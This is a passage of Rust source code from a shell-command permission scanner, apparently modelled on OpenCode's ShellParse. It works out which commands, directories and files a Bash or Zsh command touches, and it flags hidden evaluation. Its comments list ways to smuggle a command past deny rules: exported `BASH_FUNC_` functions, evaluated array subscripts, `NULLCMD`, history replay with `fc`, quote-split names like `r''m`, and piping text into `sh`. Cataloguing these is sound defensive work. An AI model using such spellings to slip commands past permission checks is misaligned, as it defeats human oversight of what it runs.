            let nested = std::mem::take(&mut self.heredoc_nested);
            self.out.extend(nested);
        }
    }

    /// Flags for an assignment word `name[sub]=value`.
    fn assignment_flags(&mut self, raw: &str) {
        let (name, value) = raw.split_once('=').unwrap_or((raw, ""));
        if let Some((_, sub)) = name.split_once('[') {
            if sub
                .chars()
                .any(|c| is_name_start(c) || c == '$' || c == '`')
            {
                self.flags.sink = true;
            }
        }
        let name = name.trim_end_matches('+');
        if CD_CONTEXT.contains(&name.split('[').next().unwrap_or(name)) {
            self.flags.cd_context = true;
        }
        if SHELL_EVALUATED.contains(&name) {
            self.flags.sink = true;
        }
        if shell_table(name.split('[').next().unwrap_or(name)) {
            // `BASH_CMDS[ls]=path`, Zsh `functions[f]=code`: what a name runs.
            self.flags.eval();
        }
        if matches!(name, "NULLCMD" | "READNULLCMD") {
            // Zsh runs it for a bare redirect: `NULLCMD=rm; >x`.
            self.flags.eval();
        }
        if name.starts_with("BASH_FUNC_") {
            // An exported function a child Bash defines: `env
            // 'BASH_FUNC_ls%%=() { rm x; }' bash -c ls` runs `rm x`.
            self.flags.eval();
        }
        if let Some(list) = value.strip_prefix('(') {
            if list.contains('[') {
                self.flags.sink = true;
            }
            if list.contains(['*', '?']) {
                self.flags.payload = true;
            }
        }
    }

    /// Flags for builtins that bind, read or evaluate text.
    fn builtin_flags(&mut self, words: &[Word]) {
        let mut i = 0;
        while i < words.len() && matches!(words[i].value.as_str(), "command" | "builtin" | "exec") {
            i += 1;
            while i < words.len() && words[i].value.starts_with('-') {
                i += 1;
            }
        }
        let Some(name) = words.get(i).map(|w| w.value.as_str()) else {
            return;
        };
        // `=env` (Zsh) and `/usr/bin/env` are `env`.
        let name = name.rsplit('/').next().unwrap_or(name);
        let name = name.strip_prefix('=').unwrap_or(name);
        let args = &words[i + 1..];
        match name {
            "declare" | "typeset" | "local" | "export" | "readonly" | "integer" | "float"
            | "env" => {
                for w in args.iter().filter(|w| !w.value.starts_with(['-', '+'])) {
                    if w.value.contains('=') {
                        self.bind_assignment(&w.raw);
                        self.note_command_var(&w.raw, &w.value);
                    }
                }
            }
            // Every operand may be a name these bind to text (options and
            // their arguments too: binding more names only flags more).
            "printf" | "print" | "wait"
                if !args
                    .iter()
                    .any(|w| w.value.starts_with('-') && w.value[1..].contains(['v', 'p'])) => {}
            "read" | "mapfile" | "readarray" | "getopts" | "vared" | "printf" | "print"
            | "wait" | "select" => {
                for w in args {
                    self.bind_text(&w.value);
                }
            }
            _ => {}
        }
        let option = |c: &[char]| {
            args.iter().any(|w| {
                w.value.starts_with('-') && !w.value.starts_with("--") && w.value.contains(c)
            })
        };
        // `mapfile -C cb` and `compgen -C cmd`/`-F f` run code; `fc` runs
        // commands from the history, which `history -s`/`print -s` fill
        // (`history -s 'rm x'; fc -s`).
        if (matches!(name, "mapfile" | "readarray" | "compgen" | "complete") && option(&['C', 'F']))
            || matches!(name, "fc" | "history")
            || (name == "print" && option(&['s', 'S', 'z']))
            || (name == "r" && args.is_empty())
        {
            self.flags.eval();
        }
        if matches!(
            name,
            "declare"
                | "typeset"
                | "local"
                | "export"
                | "readonly"
                | "read"
                | "mapfile"
                | "readarray"
                | "getopts"
                | "printf"
                | "print"
                | "vared"
                | "unset"
                | "set"
                | "setopt"
                | "unsetopt"
                | "emulate"
                | "shopt"
        ) && (matches!(name, "setopt" | "unsetopt" | "emulate" | "shopt")
            || args.iter().any(|w| {
                let n = w.value.split(['=', '[']).next().unwrap_or("");
                CD_CONTEXT.contains(&n.trim_end_matches('+'))
                    || (name == "set"
                        && (w.value == "physical"
                            || (w.value.starts_with(['-', '+'])
                                && !w.value.starts_with("--")
                                && w.value.contains('P'))))
            }))
        {
            // `set -P` makes `cd ..` physical; `read CDPATH` sets the path.
            self.flags.cd_context = true;
        }
        let operand_evaluates = |w: &Word| w.value.contains('[') || w.raw.contains(['$', '`']);
        match name {
            "printf" | "print" | "test" | "[" | "wait" => {
                // These bind a variable only with an option naming it.
                let flag = match name {
                    "wait" => 'p',
                    _ => 'v',
                };
                let binds = args
                    .iter()
                    .any(|w| w.value.starts_with('-') && w.value[1..].chars().any(|c| c == flag));
                if binds && args.iter().any(operand_evaluates) {
                    self.flags.sink = true;
                }
            }
            "declare" | "typeset" | "local" | "export" | "readonly" | "unset" | "integer"
            | "float" | "read" | "mapfile" | "readarray" | "getopts" | "vared" | "unsetenv" => {
                if args.iter().any(|w| {
                    let n = w.value.split(['=', '[']).next().unwrap_or("");
                    !w.value.starts_with(['-', '+']) && shell_table(n.trim_end_matches('+'))
                }) {
                    self.flags.eval();
                }
                let integer = ["declare", "typeset", "local"].contains(&name)
                    && args
                        .iter()
                        .any(|w| w.value.starts_with(['-', '+']) && w.value.contains(['i', 'n']));
                if integer
                    || ["integer", "float"].contains(&name)
                    || args.iter().any(operand_evaluates)
                {
                    self.flags.sink = true;
                }
            }
            "let" => self.flags.sink = true,
            "env" => {
                for w in args
                    .iter()
                    .take_while(|w| !w.value.starts_with('-') || w.value.contains('='))
                {
                    if env_assignment(&w.value) {
                        self.assignment_flags(&w.value);
                    }
                }
            }

            "alias" if args.iter().any(|w| w.value.contains('=')) => self.flags.eval(),
            // `hash -p path name` (Bash), `hash name=path` (Zsh).
            "hash"
                if args
                    .iter()
                    .any(|w| w.value.starts_with("-p") || w.value.contains('=')) =>
            {
                self.flags.eval()
            }
            "enable" | "setopt" | "unsetopt" | "emulate" | "shopt" => self.flags.eval(),
            // Zsh `set -A name values` assigns an array (`set -A functions ...`).
            "set" if args.iter().any(|w| w.value == "-A" || w.value == "+A") => self.flags.eval(),
            _ => {}
        }
        // Text only known at run time.
        if matches!(
            name,
            "read" | "mapfile" | "readarray" | "getopts" | "vared" | "source" | "."
        ) || (name == "set"
            && args
                .iter()
                .any(|w| !w.quoted && w.raw.contains(['*', '?', '['])))
        {
            self.flags.payload = true;
        }
    }

    fn simple_command(&mut self) -> Result<(), Opaque> {
        let mut start = None;
        let mut end = 0;
        let mut words: Vec<Word> = Vec::new();
        let mut assignments = 0;
        let mut redirects: Vec<(usize, usize)> = Vec::new(); // (words before it, op_end)
        let mut nested = Vec::new();
        let mut heredoc = false;
        let mut writes = Vec::new();
        // A command starting `{name}>`: with no words, Zsh reads `{name}` as
        // the group `{ name }` and runs `name`.
        let mut named_fd = false;
        loop {
            match self.peek()? {
                Tok::Word(_) => {
                    let Tok::Word(mut w) = self.next()? else {
                        unreachable!()
                    };
                    start.get_or_insert(w.start);
                    end = w.end;
                    nested.append(&mut w.nested);
                    if words.is_empty() && w.assignment {
                        self.assignment_flags(&w.raw);
                        self.bind_assignment(&w.raw);
                        self.note_command_var(&w.raw, &w.value);
                        assignments += 1;
                        continue;
                    }
                    if words.is_empty() && !w.quoted && redirects.is_empty() && assignments == 0 {
                        // `name() body` defines a function; only the body runs.
                        let mut i = self.pos;
                        while matches!(self.at(i), Some(' ') | Some('\t')) {
                            i += 1;
                        }
                        if self.peeked.is_none() && self.at(i) == Some('(') {
                            let mut j = i + 1;
                            while matches!(self.at(j), Some(' ') | Some('\t')) {
                                j += 1;
                            }
                            if self.at(j) == Some(')') {
                                self.pos = j + 1;
                                self.out.extend(nested);
                                return self.function_body();
                            }
                        }
                    }
                    words.push(w);
                }
                Tok::Redir(_) => {
                    let Tok::Redir(r) = self.next()? else {
                        unreachable!()
                    };
                    if start.is_none() && self.at(r.start) == Some('{') {
                        named_fd = true;
                    }
                    start.get_or_insert(r.start);
                    end = r.end;
                    heredoc |= r.heredoc;
                    redirects.push((words.len(), r.op_end));
                    nested.extend(r.nested);
                    writes.extend(r.write);
                }
                _ => break,
            }
        }
        let Some(start) = start else {
            return Err("invalid-structure");
        };
        if words.is_empty() {
            if named_fd {
                self.flags.eval();
            }
            if let Some(&(_, op_end)) = redirects.first() {
                self.push(
                    Command {
                        redirect_prefix_end: Some(op_end - start),
                        writes,
                        ..Default::default()
                    },
                    start,
                    end,
                    heredoc,
                );
            }
            self.out.extend(nested);
            return Ok(());
        }
        self.builtin_flags(&words);
        let first = &words[0];
        // A declaration binds variables and nothing else only when every
        // operand is a plain name or `name=value` with a static value: a
        // subscript is evaluated (`declare 'a[$(cmd)]=1'` runs `cmd`).
        let declaration = assignments == 0
            && redirects.is_empty()
            && first.raw == first.value
            && DECLARATIONS.contains(&first.value.as_str())
            && words[1..]
                .iter()
                .all(|w| static_declaration_operand(&w.raw));
        let redirect_word_count = redirects
            .iter()
            .find(|(before, _)| *before > 0 && *before < words.len())
            .map(|(before, _)| *before);
        let cmd = Command {
            resource: String::new(),
            words: words.iter().map(|w| w.value.clone()).collect(),
            raw_words: words.iter().map(|w| w.raw.clone()).collect(),
            declaration,
            redirect_word_count,
            redirect_prefix_end: None,
            writes,
            alternate: false,
            arithmetic: false,
        };
        self.push(cmd, start, end, heredoc);
        self.out.extend(nested);
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Permission resources (OpenCode's ShellParse)
// ---------------------------------------------------------------------------

/// What a command needs permission for.
#[derive(Debug, Clone, PartialEq, Default)]
pub struct Analysis {
    /// `(resource, save)`: the command checked against `shell` rules, and the
    /// rule "always allow" saves for it.
    pub commands: Vec<(String, String)>,
    /// `cd`/`pushd` targets as written (relative to the working directory),
    /// with `~` expanded.
    pub directories: Vec<String>,
    /// Other names for what runs, as `(resource, save)`: a command with its
    /// quotes and assignments removed (`r''m x` is `rm x`), the command a
    /// wrapper runs (`env touch x`, `xargs rm`, `find -exec`), and the
    /// commands in a static `sh -c`/`eval`/`trap` string. Checked too, so a
    /// rule denying `rm *` also denies those spellings.
    pub delegated: Vec<(String, String)>,
    /// The shell may end up in a directory the scan cannot name (a `cd` to
    /// a computed or `-` target, `popd`, `cd -P`, `CDPATH`...), so any
    /// relative path written afterwards is only known at run time.
    pub unknown_cwd: bool,
    /// Readings only some shell gives (see [`Command::alternate`]): checked
    /// only against deny rules, so they never add a question.
    pub deny_only: Vec<(String, String)>,
    /// Files redirects write to, `(raw, value)`; `static` when `raw` names one
    /// fixed path.
    pub writes: Vec<Write>,
    /// Why the input can run code its commands do not show (arithmetic fed
    /// from text, a dynamic command name, a non-static `eval`/`sh -c`).
    pub dynamic: Option<String>,
}

/// A file a redirect writes to.
#[derive(Debug, Clone, PartialEq)]
pub struct Write {
    pub raw: String,
    /// The path with quotes removed and `~` expanded, when `raw` is static.
    pub path: Option<String>,
}

/// Commands whose first words are a subcommand: `git status`, `npm run build`.
const ARITY: &[(&str, usize)] = &[
    ("cat", 1),
    ("cd", 1),
    ("chmod", 1),
    ("chown", 1),
    ("cp", 1),
    ("echo", 1),
    ("env", 1),
    ("export", 1),
    ("grep", 1),
    ("kill", 1),
    ("killall", 1),
    ("ln", 1),
    ("ls", 1),
    ("mkdir", 1),
    ("mv", 1),
    ("ps", 1),
    ("pwd", 1),
    ("rm", 1),
    ("rmdir", 1),
    ("sleep", 1),
    ("source", 1),
    ("tail", 1),
    ("touch", 1),
    ("unset", 1),
    ("which", 1),
    ("aws", 3),
    ("az", 3),
    ("bazel", 2),
    ("brew", 2),
    ("bun", 2),
    ("bun run", 3),
    ("bun x", 3),
    ("cargo", 2),
    ("cargo add", 3),
    ("cargo run", 3),
    ("cdk", 2),
    ("cf", 2),
    ("cmake", 2),
    ("composer", 2),
    ("consul", 2),
    ("consul kv", 3),
    ("crictl", 2),
    ("deno", 2),
    ("deno task", 3),
    ("doctl", 3),
    ("docker", 2),
    ("docker builder", 3),
    ("docker compose", 3),
    ("docker container", 3),
    ("docker image", 3),
    ("docker network", 3),
    ("docker volume", 3),
    ("eksctl", 2),
    ("eksctl create", 3),
    ("firebase", 2),
    ("flyctl", 2),
    ("gcloud", 3),
    ("gh", 3),
    ("git", 2),
    ("git config", 3),
    ("git remote", 3),
    ("git stash", 3),
    ("go", 2),
    ("gradle", 2),
    ("helm", 2),
    ("heroku", 2),
    ("hugo", 2),
    ("ip", 2),
    ("ip addr", 3),
    ("ip link", 3),
    ("ip netns", 3),
    ("ip route", 3),
    ("kind", 2),
    ("kind create", 3),
    ("kubectl", 2),
    ("kubectl kustomize", 3),
    ("kubectl rollout", 3),
    ("kustomize", 2),
    ("make", 2),
    ("mc", 2),
    ("mc admin", 3),
    ("minikube", 2),
    ("mongosh", 2),
    ("mysql", 2),
    ("mvn", 2),
    ("ng", 2),
    ("npm", 2),
    ("npm exec", 3),
    ("npm init", 3),
    ("npm run", 3),
    ("npm view", 3),
    ("npx", 2),
    ("nvm", 2),
    ("nx", 2),
    ("openssl", 2),
    ("openssl req", 3),
    ("openssl x509", 3),
    ("pip", 2),
    ("pipenv", 2),
    ("pnpm", 2),
    ("pnpm dlx", 3),
    ("pnpm exec", 3),
    ("pnpm run", 3),
    ("poetry", 2),
    ("podman", 2),
    ("podman container", 3),
    ("podman image", 3),
    ("psql", 2),
    ("pulumi", 2),
    ("pulumi stack", 3),
    ("python", 2),
    ("pyenv", 2),
    ("rake", 2),
    ("rbenv", 2),
    ("redis-cli", 2),
    ("rustup", 2),
    ("serverless", 2),
    ("sfdx", 3),
    ("skaffold", 2),
    ("sls", 2),
    ("sst", 2),
    ("swift", 2),
    ("systemctl", 2),
    ("terraform", 2),
    ("terraform workspace", 3),
    ("tmux", 2),
    ("turbo", 2),
    ("ufw", 2),
    ("vault", 2),
    ("vault auth", 3),
    ("vault kv", 3),
    ("vercel", 2),
    ("volta", 2),
    ("wp", 2),
    ("yarn", 2),
    ("yarn dlx", 3),
    ("yarn run", 3),
];

/// The leading words that name what a command does (`git status`, `npm run build`).
pub fn prefix(tokens: &[String]) -> Vec<String> {
    let tokens = &tokens[..tokens.len().min(3)];
    for len in (1..=tokens.len()).rev() {
        let key = tokens[..len].join(" ");
        if let Some((_, arity)) = ARITY.iter().find(|(k, _)| *k == key) {
            return tokens[..(*arity).min(tokens.len())].to_vec();
        }
    }
    tokens.iter().take(1).cloned().collect()
}

const CWD: [&str; 4] = ["cd", "chdir", "popd", "pushd"];

/// The permission resources of `command`, or why it cannot be analyzed.
pub fn analyze(command: &str, cwd: &Path) -> Result<Analysis, String> {
    analyze_shared(command, cwd, &Shared::default())
}

fn analyze_shared(command: &str, cwd: &Path, shared: &Shared) -> Result<Analysis, String> {
    let refuse = |reason: Opaque| {
        let reason = if reason == TOO_COMPLEX {
            "command too complex to check"
        } else {
            reason
        };
        format!("Portable shell scanner cannot analyze command: {reason}")
    };
    let mut out = Analysis::default();
    analyze_into(command, cwd, shared, 0, &mut out).map_err(refuse)?;
    if command.contains("\\\n") {
        // The shell removes line continuations before it reads anything
        // else, so `$a\<newline>[x]` and `READNUL\<newline>LCMD=rm` mean
        // what they say joined. Check that reading too: its commands as
        // other names for what runs, everything else added.
        let joined = join_continuations(command);
        let mut alt = Analysis::default();
        if joined != command && analyze_into(&joined, cwd, shared, 0, &mut alt).is_ok() {
            for entry in alt.commands.into_iter().chain(alt.delegated) {
                if !out.commands.contains(&entry) && !out.delegated.contains(&entry) {
                    out.delegated.push(entry);
                }
            }
            out.deny_only.extend(alt.deny_only);
            for w in alt.writes {
                if !out.writes.contains(&w) {
                    out.writes.push(w);
                }
            }
            for d in alt.directories {
                if !out.directories.contains(&d) {
                    out.directories.push(d);
                }
            }
            if let Some(d) = alt.dynamic {
                out.dynamic.get_or_insert(d);
            }
            out.unknown_cwd |= alt.unknown_cwd;
        }
    }
    if shared.exhausted() {
        // A nested scan (a shell string, the joined reading) ran out of
        // steps and was treated as unreadable: refuse the whole command.
        return Err(refuse(TOO_COMPLEX));
    }
    let executable =
        command.contains('`') || ["$(", "<(", ">("].iter().any(|t| command.contains(t));
    if out.commands.is_empty() && out.delegated.is_empty() && executable {
        // Nothing to check, yet the input has executable syntax: check it
        // whole rather than not at all.
        out.commands
            .push((command.to_string(), command.to_string()));
    }
    Ok(out)
}

/// `text` with backslash-newline pairs removed outside single quotes.
fn join_continuations(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut chars = text.chars().peekable();
    let (mut single, mut double) = (false, false);
    while let Some(c) = chars.next() {
        match c {
            '\'' if !double => single = !single,
            '"' if !single => double = !double,
            '\\' if !single => {
                match chars.peek() {
                    Some('\n') => {
                        chars.next();
                    }
                    Some(&n) => {
                        out.push(c);
                        out.push(n);
                        chars.next();
                    }
                    None => out.push(c),
                }
                continue;
            }
            _ => {}
        }
        out.push(c);
    }
    out
}

const MAX_DELEGATION: usize = 8;

fn analyze_into(
    command: &str,
    cwd: &Path,
    shared: &Shared,
    depth: usize,
    out: &mut Analysis,
) -> Result<(), Opaque> {
    let scanned = scan_shared(command, shared)?;
    if let Some(reason) = scanned.dynamic {
        out.dynamic.get_or_insert_with(|| reason.to_string());
    }
    out.unknown_cwd |= scanned.cd_context;
    let vars = std::mem::take(&mut *shared.command_vars.borrow_mut());
    for (raw, value) in &vars {
        command_var(raw, value, cwd, shared, depth, out)?;
    }
    for item in scanned.commands {
        for (raw, value) in &item.writes {
            push_write(out, raw, value, cwd);
        }
        if item.declaration {
            continue;
        }
        if item.alternate {
            if item.words.is_empty() {
                continue;
            }
            if !static_command_name(&item.raw_words[0]) {
                // Dash runs `(( $x ))` as the command `$x`.
                if dash_name_matters(&item.raw_words[0], shared) {
                    mark_dynamic(out, "dynamic-command-name");
                }
                continue;
            }
            // Collected apart, then moved to `deny_only`.
            let mut alt = Analysis::default();
            let entry = (
                item.resource.clone(),
                save_pattern(&item.words, &item.resource),
            );
            alt.delegated.push(entry);
            let cooked = item.words.join(" ");
            alt.delegated
                .push((cooked.clone(), save_pattern(&item.words, &cooked)));
            delegate(
                &item.raw_words,
                &item.words,
                cwd,
                shared,
                depth + 1,
                &mut alt,
            )?;
            out.deny_only.extend(alt.commands);
            out.deny_only.extend(alt.delegated);
            out.deny_only.extend(alt.deny_only);
            continue;
        }
        if let Some(end) = item.redirect_prefix_end {
            let chars: Vec<char> = item.resource.chars().collect();
            let head: String = chars[..end.min(chars.len())].iter().collect();
            let sep = match chars.get(end) {
                Some('\t') => '\t',
                Some('\n') => '\n',
                _ => ' ',
            };
            let entry = (item.resource.clone(), format!("{head}{sep}*"));
            if depth == 0 {
                out.commands.push(entry);
            } else {
                out.delegated.push(entry);
            }
            continue;
        }
        let words: Vec<String> = match item.redirect_word_count {
            Some(n) => item.raw_words[..n].to_vec(),
            None => item.raw_words.clone(),
        };
        if let Some(index) = directory_command(&item.words) {
            let (dirs, complete) =
                directory_args(&item.raw_words[index..], &item.words[index..], cwd);
            out.unknown_cwd |= !complete;
            out.directories.extend(dirs);
            // A quoted spelling (`'cd' /tmp`) still changes directory, but
            // stays a command checked by the shell rules, as in OpenCode.
            if index == 0 && complete && item.raw_words[0] == item.words[0] {
                continue;
            }
        }
        let entry = (item.resource.clone(), save_pattern(&words, &item.resource));
        if depth == 0 {
            out.commands.push(entry);
        } else {
            out.delegated.push(entry);
        }
        let cooked = item.words.join(" ");
        if cooked != item.resource {
            out.delegated
                .push((cooked.clone(), save_pattern(&item.words, &cooked)));
        }
        if !item.arithmetic {
            delegate(&item.raw_words, &item.words, cwd, shared, depth, out)?;
        }
    }
    Ok(())
}

/// The rule "always allow" saves: the command's leading words (see
/// [`prefix`]) and `*`. When those words include an option the command is
/// saved exactly: `git -c *` or `make -f *` would allow any config or makefile.
fn save_pattern(words: &[String], resource: &str) -> String {
    let p = prefix(words);
    if p.iter().skip(1).any(|w| w.starts_with('-')) {
        resource.to_string()
    } else {
        format!("{} *", p.join(" "))
    }
}

fn mark_dynamic(out: &mut Analysis, reason: &str) {
    out.dynamic.get_or_insert_with(|| reason.to_string());
}

/// A file a redirect (or a program such as `flock`) writes: `raw` as
/// written, `value` with quotes removed.
fn push_write(out: &mut Analysis, raw: &str, value: &str, cwd: &Path) {
    // Dash has no `$'...'`: such a target is another name there.
    let path = (static_command_name(raw) && !raw.contains("$'") && !raw.contains("$\""))
        .then(|| expand_known_directory(value, cwd, tilde_prefix(raw, value)))
        .flatten();
    let differs = path.as_deref() != Some(value);
    out.writes.push(Write {
        raw: raw.to_string(),
        // A glob in a redirect target is expanded when it matches one file.
        path,
    });
    if value.starts_with('~') && !plain_tilde(raw) && differs {
        // `""~/x`: `$HOME/x` in Zsh, `./~/x` in Bash.
        out.writes.push(Write {
            raw: raw.to_string(),
            path: static_command_name(raw).then(|| value.to_string()),
        });
    }
}

/// A file named inside a program's own text (`sed 'w out'`, `awk '{print >
/// "out"}'`): no shell expansion applies, so the name is the path; `None`
/// when the program computes it.
fn push_literal_write(out: &mut Analysis, name: Option<&str>, program: &str) {
    out.writes.push(Write {
        raw: name.unwrap_or(program).to_string(),
        path: name.map(str::to_string),
    });
}

/// What a command runs besides itself: a wrapped command, `find -exec`
/// commands, or the code in a shell string.
fn delegate(
    raw: &[String],
    cooked: &[String],
    cwd: &Path,
    shared: &Shared,
    depth: usize,
    out: &mut Analysis,
) -> Result<(), Opaque> {
    let Some(name) = cooked.first() else {
        return Ok(());
    };
    if !static_command_name(&raw[0]) {
        mark_dynamic(out, "dynamic-command-name");
        return Ok(());
    }
    if depth >= MAX_DELEGATION {
        mark_dynamic(out, "dynamic-execution");
        return Ok(());
    }
    let mut base = name.rsplit('/').next().unwrap_or(name);
    if strip_empty_quotes(&raw[0]).starts_with('=') {
        // Zsh's `=rm` (or `""=rm`) runs the `rm` found on PATH.
        base = base.strip_prefix('=').unwrap_or(base);
    }
    if base != name && !base.is_empty() {
        // `../bin/rm x` runs an `rm` too: check it as one.
        let mut words = cooked.to_vec();
        words[0] = base.to_string();
        let resource = words.join(" ");
        out.delegated
            .push((resource.clone(), save_pattern(&words, &resource)));
    }
    let kind = canonical_name(base);
    let push_wrapped = |at: usize, out: &mut Analysis| -> Result<(), Opaque> {
        for j in 1..at.min(cooked.len()) {
            // `sudo GIT_SSH_COMMAND=... git fetch`.
            if assignment_word(&cooked[j]) {
                command_var(&raw[j], &cooked[j], cwd, shared, depth, out)?;
            }
        }
        if at >= cooked.len() {
            return Ok(());
        }
        if RESERVED.contains(&cooked[at].as_str()) {
            // `repeat 1 { rm x }`: a compound command the words do not show.
            mark_dynamic(out, "dynamic-execution");
            return Ok(());
        }
        let words = &cooked[at..];
        let resource = words.join(" ");
        let save = save_pattern(words, &resource);
        out.delegated.push((resource, save));
        delegate(&raw[at..], words, cwd, shared, depth + 1, out)
    };
    if ["sh", "bash", "zsh", "dash", "ksh", "mksh", "yash", "ash"].contains(&base) {
        // `bash name args`: Bash looks `name` up on PATH when no such file
        // is here, so check it as the command `name args` too.
        let (at, c) = shell_options(cooked, 1);
        if !c && at < cooked.len() && !cooked[at].contains('/') {
            let words = &cooked[at..];
            let resource = words.join(" ");
            out.delegated
                .push((resource.clone(), save_pattern(words, &resource)));
        }
    }
    if let Some(script) = shell_string(base, raw, cooked) {
        return match script {
            Some(code) => run_string(&code, cwd, shared, depth, out),
            None => {
                mark_dynamic(out, "dynamic-execution");
                Ok(())
            }
        };
    }
    if let Some(code) = inline_code(kind, raw, cooked) {
        // Code in a language other than the shell's.
        push_code_marker(name, &code, out);
        return Ok(());
    }
    match kind {
        "awk" | "gawk" | "mawk" | "nawk" => {
            return program_effects("awk", raw, cooked, cwd, shared, depth, out)
        }
        "sed" => return program_effects("sed", raw, cooked, cwd, shared, depth, out),
        "git" => return git_effects(raw, cooked, cwd, shared, depth, out),
        "ssh" | "scp" | "sftp" | "rsync" => {
            return remote_effects(kind, raw, cooked, cwd, shared, depth, out)
        }
        _ => {}
    }
    if kind == "find" {
        let mut i = 1;
        while i < cooked.len() {
            if ["-fprint", "-fprint0", "-fprintf", "-fls"].contains(&cooked[i].as_str()) {
                if let Some(file) = cooked.get(i + 1) {
                    push_write(out, &raw[i + 1], file, cwd);
                }
                i += 2;
                continue;
            }
            if ["-exec", "-execdir", "-ok", "-okdir"].contains(&cooked[i].as_str()) {
                let start = i + 1;
                let mut end = start;
                while end < cooked.len() && cooked[end] != ";" && cooked[end] != "+" {
                    end += 1;
                }
                if start < end {
                    let words = &cooked[start..end];
                    let appends = cooked.get(end).is_some_and(|w| w == "+");
                    if runs_input(&raw[start..end], words, Some("{}"), appends) {
                        // `find -exec sh -c 'echo {}' \;` runs file names.
                        mark_dynamic(out, "dynamic-execution");
                    }
                    let resource = words.join(" ");
                    out.delegated
                        .push((resource.clone(), save_pattern(words, &resource)));
                    delegate(&raw[start..end], words, cwd, shared, depth + 1, out)?;
                }
                i = end;
            }
            i += 1;
        }
        return Ok(());
    }
    if kind == "xargs" {
        if let Some(Wrapped::At(at)) = wrapped_command(base, cooked) {
            let repl = xargs_replace(&cooked[..at.min(cooked.len())]);
            let words = cooked.get(at..).unwrap_or_default();
            if runs_input(
                raw.get(at..).unwrap_or_default(),
                words,
                repl,
                repl.is_none(),
            ) {
                // `xargs -I{} sh -c 'echo {}'` runs what it reads.
                mark_dynamic(out, "dynamic-execution");
            }
        }
    }
    let Some(wrapped) = wrapped_command(base, cooked) else {
        return Ok(());
    };
    // Files the wrapper itself writes: a lock file, a typescript.
    match (kind, wrapped) {
        ("flock", Wrapped::At(k)) | ("lockf", Wrapped::At(k)) => {
            push_write(out, &raw[k - 1], &cooked[k - 1], cwd)
        }
        ("flock", Wrapped::Script(k)) => push_write(out, &raw[k - 2], &cooked[k - 2], cwd),
        ("script", w) if w != Wrapped::Nothing => match script_file(cooked) {
            Some(k) => push_write(out, &raw[k], &cooked[k], cwd),
            None => push_write(out, "typescript", "typescript", cwd),
        },
        _ => {}
    }
    let joined = |a: usize, b: usize| {
        raw[a..b]
            .iter()
            .all(|w| is_static_word(w))
            .then(|| cooked[a..b].join(" "))
    };
    match wrapped {
        Wrapped::At(at) => push_wrapped(at, out)?,
        Wrapped::Script(k) => {
            shell_code(static_text(&raw[k], &cooked[k]), cwd, shared, depth, out)?
        }
        Wrapped::Joined(a, b) => shell_code(joined(a, b).as_deref(), cwd, shared, depth, out)?,
        Wrapped::Unknown => mark_dynamic(out, "dynamic-execution"),
        Wrapped::Nothing => {}
    }
    Ok(())
}

/// The typescript file `script` writes, by its index in `cooked`, or
/// `None` for the default `typescript`.
fn script_file(cooked: &[String]) -> Option<usize> {
    let mut i = 1;
    while i < cooked.len() {
        let w = cooked[i].as_str();
        if [
            "-c",
            "--command",
            "-t",
            "-T",
            "-E",
            "-I",
            "-O",
            "-B",
            "-m",
            "-o",
        ]
        .contains(&w)
        {
            i += 2;
        } else if w.starts_with('-') && !w.starts_with("--") && w.ends_with('c') && w.len() > 1 {
            i += 2; // `-qc CODE`
        } else if w.starts_with('-') && w != "-" {
            i += 1;
        } else {
            return Some(i);
        }
    }
    None
}

/// Words that start a compound command where a command name is expected.
const RESERVED: [&str; 16] = [
    "{", "}", "(", "if", "then", "for", "while", "until", "case", "select", "[[", "function",
    "repeat", "foreach", "coproc", "!",
];

/// Scan a static code string run by `sh -c`, `eval` or `trap`.
fn run_string(
    code: &str,
    cwd: &Path,
    shared: &Shared,
    depth: usize,
    out: &mut Analysis,
) -> Result<(), Opaque> {
    let mut inner = Analysis::default();
    if analyze_into(code, cwd, shared, depth + 1, &mut inner).is_err() {
        mark_dynamic(out, "dynamic-execution");
        return Ok(());
    }
    out.delegated.extend(inner.commands);
    out.delegated.extend(inner.delegated);
    out.deny_only.extend(inner.deny_only);
    out.directories.extend(inner.directories);
    out.writes.extend(inner.writes);
    out.unknown_cwd |= inner.unknown_cwd;
    if let Some(d) = inner.dynamic {
        mark_dynamic(out, &d);
    }
    Ok(())
}

/// A command name the shell resolves the same way every time: static, with
/// no glob or brace expansion.
fn static_command_name(raw: &str) -> bool {
    is_static_word(raw) && {
        let mut quote = None;
        let mut escaped = false;
        raw.chars().all(|c| {
            if escaped {
                escaped = false;
                return true;
            }
            match (quote, c) {
                (None, '\\') => escaped = true,
                (None, '\'' | '"') => quote = Some(c),
                (Some(q), c) if c == q => quote = None,
                (None, '*' | '?' | '[' | '{') => return false,
                _ => {}
            }
            true
        })
    }
}

/// For a shell run with `-c`, `eval` or `trap`: `Some(Some(code))` when the
/// code is static, `Some(None)` when it is not, `None` for other commands.
fn shell_string(base: &str, raw: &[String], cooked: &[String]) -> Option<Option<String>> {
    let static_join = |from: usize| -> Option<String> {
        let words = raw.get(from..)?;
        if words.is_empty() || !words.iter().all(|w| is_static_word(w)) {
            return None;
        }
        Some(cooked[from..].join(" "))
    };
    match base {
        "eval" => {
            let from = 1 + usize::from(cooked.get(1).is_some_and(|w| w == "--"));
            Some(static_join(from).or_else(|| (cooked.len() == from).then(String::new)))
        }
        "source" | "." => {
            let i = 1 + usize::from(cooked.get(1).is_some_and(|w| w == "--"));
            raw.get(i)
                .is_some_and(|r| computed_source(r, &cooked[i]))
                .then_some(None)
        }
        "trap" => {
            let mut i = 1;
            if cooked.get(i).is_some_and(|w| w == "--") {
                i += 1;
            }
            match cooked.get(i).map(String::as_str) {
                None | Some("-") => None,
                // Zsh runs an unknown `-word` as the code: `trap --'rm x' 0`.
                Some(w)
                    if w.starts_with('-')
                        && w.len() > 1
                        && w[1..].chars().all(|c| "lpP".contains(c)) =>
                {
                    None
                }
                Some(_) if cooked.len() == i + 1 => None, // `trap SIG` resets
                Some(_) => Some(is_static_word(&raw[i]).then(|| cooked[i].clone())),
            }
        }
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "mksh" | "yash" | "fish" | "ash" | "busybox" => {
            let mut i = 1;
            if base == "busybox" {
                if cooked.get(1).is_none_or(|w| w != "sh" && w != "ash") {
                    return None;
                }
                i = 2;
            }
            let (i, c) = shell_options(cooked, i);
            if !c {
                // A shell given no script file runs its standard input
                // (`echo 'rm x' | sh`), as does `-s`; a script from a pipe or
                // a process substitution is code the words do not show.
                let stdin = raw.get(i).is_none_or(|r| computed_source(r, &cooked[i]))
                    || cooked[1..i].iter().any(|w| {
